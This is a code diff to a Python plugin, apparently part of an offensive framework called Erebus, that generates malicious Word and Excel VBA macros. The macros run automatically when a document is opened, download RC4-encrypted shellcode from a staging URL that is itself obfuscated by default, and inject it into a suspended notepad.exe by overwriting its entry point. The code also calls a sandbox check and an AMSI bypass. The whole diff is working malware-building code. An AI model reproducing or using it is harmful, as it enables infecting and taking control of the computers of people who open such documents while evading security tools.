@@ -464,8 +464,7 @@ def _vba_trigger_sub(trigger_type: str, call_target: str, is_word: bool = False)
         trigger_sub = "Auto_Save"
         event_sub = "Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)" if not is_word else "Sub Document_BeforeSave(ByVal SaveUI As Boolean, Cancel As Boolean)"
     else:
-        # Word uses AutoOpen; Excel uses Auto_Open (the correct legacy name for Excel)
-        trigger_sub = "AutoOpen" if is_word else "Auto_Open"
+        trigger_sub = "AutoOpen"
         event_sub = "Sub Document_Open()" if is_word else "Sub Workbook_Open()"
 
     lines = [f"Sub {trigger_sub}()\n    {call_target}\nEnd Sub\n"]
@@ -692,7 +691,6 @@ _PAGE_READWRITE     = "&H04"   # PAGE_READWRITE
 _PAGE_EXECUTE_READ  = "&H20"   # PAGE_EXECUTE_READ
 _MEM_COMMIT_RESERVE = "&H3000" # MEM_COMMIT | MEM_RESERVE
 _THREAD_SET_CONTEXT = "&H10"   # THREAD_SET_CONTEXT (minimum for QueueUserAPC)
-_CREATE_SUSPENDED   = "&H4"    # CREATE_SUSPENDED
 
 
 _VBA_API_DECLS = """\
@@ -818,18 +816,40 @@ End Function
 def _vba_http_getbuf(url: str, rc4_key: bytes, obfuscate_url: bool = True) -> str:
     """
     Generate GetBuf(buf() As Byte) that downloads RC4-encrypted shellcode from
-    a URL at runtime and decrypts it in memory.  No shellcode bytes are embedded.
+    a URL at runtime and decrypts it in memory.
 
-    When obfuscate_url=True the staging URL is RC4-encrypted at build time and
-    stored as an Array() of ciphertext bytes - no plaintext URL in VBA source.
-    When False the URL is a literal string (smaller, easier to audit in testing).
+    When obfuscate_url=True (default) the staging URL is RC4-encrypted at build
+    time and stored as an Array() of ciphertext bytes - no plaintext URL in VBA
+    source or compiled p-code string tables.
+    When obfuscate_url=False the URL is embedded as a plaintext string literal.
 
-    WinHttp.WinHttpRequest.5.1 is available on all Windows >= Vista without
-    extra dependencies.  Falls back to MSXML2.ServerXMLHTTP on failure.
+    The encrypted blob must be hosted at *url* before the document is opened.
+    Use rc4_encrypt(shellcode_bytes, rc4_key) at build time to produce it.
     """
     key_tokens = ", ".join(str(b) for b in rc4_key)
 
-    rc4_func = (
+    if obfuscate_url:
+        url_key = secrets.token_bytes(8)
+        enc_url = _rc4_encrypt(url.encode("ascii"), url_key)
+        url_enc_tokens = ", ".join(str(b) for b in enc_url)
+        url_key_tokens = ", ".join(str(b) for b in url_key)
+        url_block = (
+            f"    urlEnc = Array({url_enc_tokens})\r\n"
+            f"    urlKey = Array({url_key_tokens})\r\n"
+            "    urlDec = Rc4D(urlEnc, urlKey)\r\n"
+            "    sUrl = StrConv(urlDec, vbUnicode)\r\n"
+        )
+        url_vars = (
+            "    Dim urlEnc As Variant\r\n"
+            "    Dim urlKey As Variant\r\n"
+            "    Dim urlDec() As Byte\r\n"
+            "    Dim sUrl As String\r\n"
+        )
+    else:
+        url_block = f'    sUrl = "{url}"\r\n'
+        url_vars  = "    Dim sUrl As String\r\n"
+
+    return (
         # data As Variant so callers can pass either Byte() or Array() without type mismatch
         "Private Function Rc4D(data As Variant, k As Variant) As Byte()\r\n"
         "    Dim s(255) As Integer\r\n"
@@ -854,38 +874,12 @@ def _vba_http_getbuf(url: str, rc4_key: bytes, obfuscate_url: bool = True) -> st
         "    Rc4D = o\r\n"
         "End Function\r\n"
         "\r\n"
-    )
-
-    if obfuscate_url:
-        url_key = secrets.token_bytes(8)
-        enc_url = _rc4_encrypt(url.encode("ascii"), url_key)
-        url_enc_tokens = ", ".join(str(b) for b in enc_url)
-        url_key_tokens = ", ".join(str(b) for b in url_key)
-        url_decl = (
-            "    Dim urlEnc As Variant\r\n"
-            "    Dim urlKey As Variant\r\n"
-            "    Dim urlDec() As Byte\r\n"
-            "    Dim sUrl As String\r\n"
-        )
-        url_resolve = (
-            f"    urlEnc = Array({url_enc_tokens})\r\n"
-            f"    urlKey = Array({url_key_tokens})\r\n"
-            "    urlDec = Rc4D(urlEnc, urlKey)\r\n"
-            "    sUrl = StrConv(urlDec, vbUnicode)\r\n"
-        )
-        url_open = '    http.Open "GET", sUrl, False\r\n'
-    else:
-        url_decl = ""
-        url_resolve = ""
-        url_open = f'    http.Open "GET", "{url}", False\r\n'
-
-    getbuf = (
         "Private Sub GetBuf(buf() As Byte)\r\n"
         "    On Error GoTo ErrH\r\n"
         "    Dim http As Object\r\n"
         "    Dim enc() As Byte\r\n"
         "    Dim kArr As Variant\r\n"
-        + url_decl +
+        + url_vars +
         "    On Error Resume Next\r\n"
         '    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")\r\n'
         "    If Not (http Is Nothing) Then\r\n"
@@ -895,8 +889,8 @@ def _vba_http_getbuf(url: str, rc4_key: bytes, obfuscate_url: bool = True) -> st
         "        If Not (http Is Nothing) Then http.setOption 2, 13056\r\n"
         "    End If\r\n"
         "    On Error GoTo ErrH\r\n"
-        + url_resolve
-        + url_open +
+        + url_block +
+        '    http.Open "GET", sUrl, False\r\n'
         '    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"\r\n'
         "    http.Send\r\n"
         "    If http.Status <> 200 Then Exit Sub\r\n"
@@ -907,8 +901,6 @@ def _vba_http_getbuf(url: str, rc4_key: bytes, obfuscate_url: bool = True) -> st
         "ErrH:\r\n"
         "End Sub\r\n"
     )
-
-    return rc4_func + getbuf
 
 
 def _rc4_encrypt(data: bytes, key: bytes) -> bytes:
@@ -1054,7 +1046,7 @@ End Sub
 {_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""
 
 
-def _vba_process_hollow(
+def _vba_address_of_entrypoint(
     vba_shellcode_src: str,
     trigger_type: str,
     target_process: str = "C:\\Windows\\System32\\notepad.exe",
@@ -1064,19 +1056,20 @@ def _vba_process_hollow(
     AddressOfEntryPoint injection into a suspended child process.
 
     Technique:
-      1. CreateProcessA(CREATE_SUSPENDED) - spawn target suspended
+      1. CreateProcessA(CREATE_SUSPENDED | CREATE_NO_WINDOW) - spawn target suspended
       2. NtQueryInformationProcess(ProcessBasicInformation) - get PEB address
       3. ReadProcessMemory(PEB+0x10) - get ImageBase (x64) / PEB+0x08 (x86)
       4. ReadProcessMemory(ImageBase+0x3C) - e_lfanew → PE header offset
       5. ReadProcessMemory(PE+0x28) - AddressOfEntryPoint RVA
-      6. VirtualProtectEx(entryPt, PAGE_READWRITE) - make .text writable
-      7. WriteProcessMemory(entryPt, shellcode) - overwrite entry point
-      8. VirtualProtectEx(entryPt, original) - restore RX
-      9. ResumeThread - entry point IS the shellcode
+      6. WriteProcessMemory(entryPt, shellcode) - kernel bypasses page protection
+      7. ResumeThread - entry point IS the shellcode
+    Note: VirtualProtectEx is intentionally omitted. WriteProcessMemory from an
+    external process uses kernel-mode MDL writes that bypass user-mode page
+    protection (same as C# P/Invoke reference). Calling VirtualProtectEx to set
+    PAGE_READWRITE removes execute permission; if the second call (restore) fails
+    under On Error Resume Next the page becomes non-executable → crash on resume.
     """
-    tp  = target_process.replace("\\\\", "\\").replace("\\", "\\\\")
-    prw = _PAGE_READWRITE
-    cs  = _CREATE_SUSPENDED
+    tp = target_process.replace("\\\\", "\\").replace("\\", "\\\\")
 
     return f"""' ---------------------------------------------------------------------------
 ' AddressOfEntryPoint injection API declarations
@@ -1097,15 +1090,14 @@ Private Declare PtrSafe Function ReadProcessMemory Lib "kernel32" _
 Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" _
     (ByVal hProc As LongPtr, ByVal lpBase As LongPtr, _
      ByRef lpBuf As Any, ByVal nSize As LongPtr, ByRef nWritten As LongPtr) As Long
-Private Declare PtrSafe Function VirtualProtectEx Lib "kernel32" _
-    (ByVal hProc As LongPtr, ByVal lpAddr As LongPtr, _
-     ByVal dwSize As LongPtr, ByVal flNew As Long, ByRef lpOld As Long) As Long
 Private Declare PtrSafe Function ResumeThread Lib "kernel32" _
     (ByVal hThread As LongPtr) As Long
 Private Declare PtrSafe Function CloseHandle Lib "kernel32" _
     (ByVal hObj As LongPtr) As Long
 Private Declare PtrSafe Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" _
     (ByRef dst As Any, ByRef src As Any, ByVal cb As LongPtr)
+Private Declare PtrSafe Sub Sleep Lib "kernel32" _
+    (ByVal dwMs As Long)
 #Else
 Private Declare Function CreateProcessA Lib "kernel32" _
     (ByVal lpApp As Long, ByVal lpCmd As String, _
@@ -1122,15 +1114,14 @@ Private Declare Function ReadProcessMemory Lib "kernel32" _
 Private Declare Function WriteProcessMemory Lib "kernel32" _
     (ByVal hProc As Long, ByVal lpBase As Long, _
      ByRef lpBuf As Any, ByVal nSize As Long, ByRef nWritten As Long) As Long
-Private Declare Function VirtualProtectEx Lib "kernel32" _
-    (ByVal hProc As Long, ByVal lpAddr As Long, _
-     ByVal dwSize As Long, ByVal flNew As Long, ByRef lpOld As Long) As Long
 Private Declare Function ResumeThread Lib "kernel32" _
     (ByVal hThread As Long) As Long
 Private Declare Function CloseHandle Lib "kernel32" _
     (ByVal hObj As Long) As Long
 Private Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" _
     (ByRef dst As Any, ByRef src As Any, ByVal cb As Long)
+Private Declare Sub Sleep Lib "kernel32" _
+    (ByVal dwMs As Long)
 #End If
 
 {_VBA_AMSI_BYPASS}
@@ -1144,6 +1135,10 @@ Private Sub ExecutePayload()
     If Not SandboxCheck() Then Exit Sub
     Dim buf() As Byte
     GetBuf buf
+    If Not IsArray(buf) Then Exit Sub
+    Dim szB As LongPtr
+    szB = UBound(buf) + 1
+    If szB = 0 Then Exit Sub
 
 #If VBA7 Then
     Dim si(103) As Byte
@@ -1155,19 +1150,15 @@ Private Sub ExecutePayload()
     si(0) = 68
 #End If
 
-    Dim r   As Long
-    Dim szB As Long
-    szB = UBound(buf) + 1
-
-    r = CreateProcessA(0, "{tp}", 0, 0, 0, {cs}, 0, 0, si(0), pi(0))
+    Dim r As Long
+    r = CreateProcessA(0, "{tp}", 0, 0, 0, &H8000004, 0, 0, si(0), pi(0))
     If r = 0 Then Exit Sub
 
 #If VBA7 Then
-    Dim hP      As LongPtr
-    Dim hT      As LongPtr
-    Dim nw      As LongPtr
-    Dim retLen  As Long
-    Dim old     As Long
+    Dim hP     As LongPtr
+    Dim hT     As LongPtr
+    Dim nw     As LongPtr
+    Dim retLen As Long
     CopyMem hP, pi(0), 8
     CopyMem hT, pi(8), 8
 
@@ -1195,19 +1186,16 @@ Private Sub ExecutePayload()
     Dim entryPt As LongPtr
     entryPt = imgBase + aoeRva
 
-    VirtualProtectEx hP, entryPt, szB, {prw}, old
     WriteProcessMemory hP, entryPt, buf(0), szB, nw
-    VirtualProtectEx hP, entryPt, szB, old, old
     ResumeThread hT
 
     CloseHandle hP
     CloseHandle hT
 #Else
-    Dim hP      As Long
-    Dim hT      As Long
-    Dim nw      As Long
-    Dim retLen  As Long
-    Dim old     As Long
+    Dim hP     As Long
+    Dim hT     As Long
+    Dim nw     As Long
+    Dim retLen As Long
     CopyMem hP, pi(0), 4
     CopyMem hT, pi(4), 4
 
@@ -1233,9 +1221,7 @@ Private Sub ExecutePayload()
     Dim entryPt As Long
     entryPt = imgBase + aoeRva
 
-    VirtualProtectEx hP, entryPt, szB, {prw}, old
     WriteProcessMemory hP, entryPt, buf(0), szB, nw
-    VirtualProtectEx hP, entryPt, szB, old, old
     ResumeThread hT
 
     CloseHandle hP
@@ -1596,7 +1582,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         loader_type: str = "createthread",
         target_process: str = "C:\\Windows\\System32\\notepad.exe",
         is_word: bool = False,
-        obfuscate_url: bool = False,
+        obfuscate_url: bool = True,
     ) -> str:
         """
         Generate a complete VBA payload that downloads RC4-encrypted shellcode
@@ -1605,19 +1591,15 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         *rc4_key* must match the key used to encrypt the staged blob (produced
         by rc4_encrypt_shellcode).  The encrypted blob should be hosted at *url*
         before the document is opened (see build artifact: shellcode.enc).
-
-        Set obfuscate_url=True to RC4-encrypt the URL at build time so no
-        plaintext staging URL appears in VBA source (mirrors the 0.9e obfuscation
-        toggle).  False (default) embeds the URL as a literal string.
         """
-        http_getbuf = _vba_http_getbuf(url, rc4_key, obfuscate_url=obfuscate_url)
+        http_getbuf = _vba_http_getbuf(url, rc4_key, obfuscate_url)
         dispatch = {
             "createthread":      lambda sc, tt: _vba_createthread(sc, tt, is_word),
             "enumlocales":       lambda sc, tt: _vba_enumlocales(sc, tt, is_word),
             "queueuserapc":      lambda sc, tt: _vba_queueapc(sc, tt, is_word),
             "earlybird":         lambda sc, tt: _vba_queueapc(sc, tt, is_word),
-            "hollowing":         lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word),
-            "process_hollowing": lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word),
+            "hollowing":         lambda sc, tt: _vba_address_of_entrypoint(sc, tt, target_process, is_word),
+            "process_hollowing": lambda sc, tt: _vba_address_of_entrypoint(sc, tt, target_process, is_word),
         }
         fn = dispatch.get(loader_type.lower(), lambda sc, tt: _vba_createthread(sc, tt, is_word))
         result = fn(http_getbuf, trigger_type)
@@ -1652,7 +1634,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         trigger_type: str = "AutoOpen",
         target_process: str = "C:\\Windows\\System32\\notepad.exe",
     ) -> str:
-        return _vba_process_hollow(vba_shellcode, trigger_type, target_process, is_word=False)
+        return _vba_address_of_entrypoint(vba_shellcode, trigger_type, target_process, is_word=False)
 
     def generate_word_vba_loader(
         self,
@@ -1667,8 +1649,8 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             "enumlocales":   lambda sc, tt: _vba_enumlocales(sc, tt, is_word=True),
             "queueuserapc":  lambda sc, tt: _vba_queueapc(sc, tt, is_word=True),
             "earlybird":     lambda sc, tt: _vba_queueapc(sc, tt, is_word=True),
-            "hollowing":     lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word=True),
-            "process_hollowing": lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word=True),
+            "hollowing":     lambda sc, tt: _vba_address_of_entrypoint(sc, tt, target_process, is_word=True),
+            "process_hollowing": lambda sc, tt: _vba_address_of_entrypoint(sc, tt, target_process, is_word=True),
         }
         fn = dispatch.get(loader_type.lower(), lambda sc, tt: _vba_createthread(sc, tt, is_word=True))
         result = fn(vba_shellcode, trigger_type)
